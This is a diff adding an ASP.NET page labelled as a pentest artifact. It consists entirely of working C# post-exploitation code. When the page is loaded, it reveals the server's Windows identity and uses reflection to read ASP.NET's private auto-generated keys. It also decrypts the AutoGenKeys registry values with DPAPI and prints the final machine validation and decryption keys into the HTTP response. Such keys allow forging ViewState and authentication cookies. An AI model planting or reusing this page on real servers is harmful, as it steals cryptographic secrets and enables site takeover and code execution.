@@ -1,0 +1,120 @@
+<%@ Page Language="C#" %>
+<%
+string MARK = "PENTEST-I034-FULL-5c91d2e7";
+try
+{
+    Response.Write(MARK + "|S0|"); Response.Flush();
+    System.Security.Principal.WindowsIdentity wi = System.Security.Principal.WindowsIdentity.GetCurrent();
+    string sid = (wi == null || wi.User == null) ? "" : wi.User.Value;
+    Response.Write("SID=" + sid + "|NAME=" + (wi == null ? "?" : wi.Name) + "|B64=" + (System.IntPtr.Size == 8) + "|"); Response.Flush();
+
+    System.Reflection.Assembly sysWeb = typeof(System.Web.HttpRuntime).Assembly;
+    System.Reflection.FieldInfo fAuto = typeof(System.Web.HttpRuntime).GetField("s_autogenKeys", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
+    byte[] autogen = fAuto == null ? null : (byte[])fAuto.GetValue(null);
+    Response.Write("AUTOGEN_LEN=" + (autogen == null ? 0 : autogen.Length) + "|"); Response.Flush();
+    if (autogen != null) Response.Write("AUTOGEN=" + System.BitConverter.ToString(autogen).Replace("-", "") + "|"); Response.Flush();
+
+    System.Text.StringBuilder reg = new System.Text.StringBuilder();
+    foreach (int view in new int[] { 64, 32 })
+    {
+        try
+        {
+            Microsoft.Win32.RegistryView rv = view == 64 ? Microsoft.Win32.RegistryView.Registry64 : Microsoft.Win32.RegistryView.Registry32;
+            using (Microsoft.Win32.RegistryKey baseKey = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, rv))
+            {
+                string p = @"SOFTWARE\Microsoft\.NETFramework\v4.0.30319\AutoGenKeys";
+                using (Microsoft.Win32.RegistryKey ak = baseKey.OpenSubKey(p))
+                {
+                    if (ak == null) { reg.Append("R" + view + "_KEY=NULL|"); continue; }
+                    string[] subs = ak.GetSubKeyNames();
+                    reg.Append("R" + view + "_SIDS=" + string.Join(",", subs) + "|");
+                    foreach (string s in subs)
+                    {
+                        try
+                        {
+                            using (Microsoft.Win32.RegistryKey k2 = ak.OpenSubKey(s))
+                            {
+                                if (k2 == null) continue;
+                                byte[] data = (byte[])k2.GetValue("Data");
+                                byte[] idata = (byte[])k2.GetValue("IData");
+                                reg.Append("R" + view + "_" + s + "_DL=" + (data == null ? 0 : data.Length) + "_IDL=" + (idata == null ? 0 : idata.Length) + "|");
+                                if (data != null && idata != null)
+                                {
+                                    reg.Append("R" + view + "_" + s + "_D=" + System.BitConverter.ToString(data).Replace("-", "") + "|");
+                                    reg.Append("R" + view + "_" + s + "_ID=" + System.BitConverter.ToString(idata).Replace("-", "") + "|");
+                                    try
+                                    {
+                                        System.Type pdType = System.Type.GetType("System.Security.Cryptography.ProtectedData, System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", false);
+                                        if (pdType == null) { reg.Append("R" + view + "_" + s + "_UP=PD_MISSING|"); }
+                                        else
+                                        {
+                                            System.Reflection.MethodInfo mUnprotect = pdType.GetMethod("Unprotect", new System.Type[] { typeof(byte[]), typeof(byte[]), typeof(System.Security.Cryptography.DataProtectionScope) });
+                                            byte[] up = (byte[])mUnprotect.Invoke(null, new object[] { data, idata, System.Security.Cryptography.DataProtectionScope.LocalMachine });
+                                            reg.Append("R" + view + "_" + s + "_UP=" + System.BitConverter.ToString(up).Replace("-", "") + "|");
+                                        }
+                                    }
+                                    catch (System.Exception ex) { reg.Append("R" + view + "_" + s + "_UPE=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_") + "|"); }
+                                }
+                            }
+                        }
+                        catch (System.Exception ex) { reg.Append("R" + view + "_" + s + "_SE=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_") + "|"); }
+                    }
+                }
+            }
+        }
+        catch (System.Exception ex) { reg.Append("R" + view + "_ERR=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_") + "|"); }
+    }
+    Response.Write(reg.ToString()); Response.Flush();
+
+    try
+    {
+        System.Type mksType = sysWeb.GetType("System.Web.Configuration.MachineKeySection");
+        System.Reflection.MethodInfo mGetAppCfg = mksType.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
+        object mks = mGetAppCfg.Invoke(null, null);
+        System.Reflection.PropertyInfo pCompat = mksType.GetProperty("CompatibilityMode");
+        System.Reflection.PropertyInfo pValidation = mksType.GetProperty("Validation");
+        System.Reflection.PropertyInfo pDecryption = mksType.GetProperty("Decryption");
+        System.Reflection.PropertyInfo pValidationKey = mksType.GetProperty("ValidationKey");
+        System.Reflection.PropertyInfo pDecryptionKey = mksType.GetProperty("DecryptionKey");
+        Response.Write("CFG_CM=" + (pCompat == null ? "?" : pCompat.GetValue(mks, null).ToString()) + "|");
+        Response.Write("CFG_V=" + (pValidation == null ? "?" : pValidation.GetValue(mks, null).ToString()) + "|");
+        Response.Write("CFG_D=" + (pDecryption == null ? "?" : pDecryption.GetValue(mks, null).ToString()) + "|");
+        Response.Write("CFG_VK=" + (pValidationKey == null ? "?" : pValidationKey.GetValue(mks, null).ToString()) + "|");
+        Response.Write("CFG_DK=" + (pDecryptionKey == null ? "?" : pDecryptionKey.GetValue(mks, null).ToString()) + "|"); Response.Flush();
+
+        System.Type acspType = sysWeb.GetType("System.Web.Security.Cryptography.AspNetCryptoServiceProvider");
+        System.Reflection.PropertyInfo piInstance = acspType.GetProperty("Instance", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
+        object provider = piInstance.GetValue(null, null);
+        System.Reflection.PropertyInfo piDefault = acspType.GetProperty("IsDefaultProvider", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
+        bool isDefault = (bool)piDefault.GetValue(provider, null);
+        Response.Write("ISDEF=" + isDefault + "|"); Response.Flush();
+
+        System.Type mkpType = sysWeb.GetType("System.Web.Security.Cryptography.MachineKeyMasterKeyProvider");
+        object mkp = System.Activator.CreateInstance(mkpType, System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public, null, new object[] { mks }, null);
+        System.Type ckType = sysWeb.GetType("System.Web.Security.Cryptography.CryptographicKey");
+        System.Reflection.MethodInfo mGetKeyMaterial = ckType.GetMethod("GetKeyMaterial", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
+        System.Reflection.MethodInfo mGetEnc = mkpType.GetMethod("GetEncryptionKey", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
+        System.Reflection.MethodInfo mGetVal = mkpType.GetMethod("GetValidationKey", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
+        object encKey = mGetEnc.Invoke(mkp, null);
+        object valKey = mGetVal.Invoke(mkp, null);
+        Response.Write("FINAL_ENC=" + System.BitConverter.ToString((byte[])mGetKeyMaterial.Invoke(encKey, null)).Replace("-", "") + "|");
+        Response.Write("FINAL_VAL=" + System.BitConverter.ToString((byte[])mGetKeyMaterial.Invoke(valKey, null)).Replace("-", "") + "|"); Response.Flush();
+    }
+    catch (System.Exception ex) { Response.Write("CFGERR=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_") + "|"); Response.Flush(); }
+
+    try
+    {
+        System.Type pt = System.Web.Compilation.BuildManager.GetCompiledType("/test.aspx");
+        Response.Write("PT_TEST=" + (pt == null ? "NULL" : pt.FullName + "/" + pt.Name) + "|"); Response.Flush();
+        System.Type pt2 = System.Web.Compilation.BuildManager.GetCompiledType("/t.aspx");
+        Response.Write("PT_T=" + (pt2 == null ? "NULL" : pt2.FullName + "/" + pt2.Name) + "|"); Response.Flush();
+    }
+    catch (System.Exception ex) { Response.Write("PTERR=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_") + "|"); Response.Flush(); }
+
+    Response.Write("|DONE");
+}
+catch (System.Exception ex)
+{
+    Response.Write("|FATAL=" + ex.GetType().Name + ":" + ex.Message.Replace("|", "_"));
+}
+%>
